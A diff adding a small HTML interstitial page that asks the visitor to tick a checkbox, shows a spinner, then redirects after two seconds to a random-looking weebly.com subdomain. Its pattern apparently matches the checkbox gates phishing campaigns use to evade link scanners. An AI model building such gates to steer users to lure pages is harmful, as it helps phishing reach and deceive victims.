@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Continue to Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f4f4f4;
+      padding-top: 100px;
+    }
+
+    .box {
+      background: white;
+      display: inline-block;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    /* Loading spinner */
+    .spinner {
+      display: inline-block;
+      width: 50px;
+      height: 50px;
+      border: 5px solid #ccc;
+      border-top-color: #007BFF;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-top: 20px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    label {
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h2>Tick the box below to continue</h2>
+    <label>
+      <input type="checkbox" id="agreeCheckbox"> I agree to continue
+    </label><br>
+    <div id="loading" class="spinner hidden"></div>
+  </div>
+
+  <script>
+    const checkbox = document.getElementById('agreeCheckbox');
+    const spinner = document.getElementById('loading');
+
+    checkbox.addEventListener('change', () => {
+      if (checkbox.checked) {
+        // Hide checkbox after ticking
+        checkbox.disabled = true;
+        spinner.classList.remove('hidden');
+
+        // Redirect after a short delay (2 seconds)
+        setTimeout(() => {
+          window.location.href = 'https://oghpoczt.weebly.com/';
+        }, 2000);
+      }
+    });
+  </script>
+
+</body>
+</html>
